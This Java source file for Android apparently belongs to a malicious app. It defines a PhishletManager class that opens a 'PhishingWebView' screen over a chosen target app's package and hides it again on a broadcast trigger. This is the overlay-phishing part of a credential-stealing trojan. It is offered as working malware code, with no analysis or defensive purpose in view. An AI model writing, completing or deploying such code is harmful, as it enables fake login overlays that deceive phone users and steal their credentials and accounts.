package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.ui.PhishingWebView;

public class PhishletManager {
    private static final String TAG = Constants.TAG + ":Phish";
    private static PhishletManager instance;
    private final Context ctx;
    private boolean active = false;

    private PhishletManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized PhishletManager get(Context ctx) {
        if (instance == null) instance = new PhishletManager(ctx);
        return instance;
    }

    public void showPhishlet(String id, String targetPkg) {
        try {
            active = true;
            Intent intent = new Intent(ctx, PhishingWebView.class);
            intent.putExtra("phishlet_id", id);
            intent.putExtra("target_pkg", targetPkg);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Show phishlet failed", e);
        }
    }

    public void hidePhishlet() {
        active = false;
        try {
            Intent intent = new Intent(Constants.ACTION_PHISH_TRIGGER);
            intent.putExtra("action", "hide");
            ctx.sendBroadcast(intent);
        } catch (Exception e) {
            Log.e(TAG, "Hide phishlet failed", e);
        }
    }

    public boolean isActive() {
        return active;
    }
}
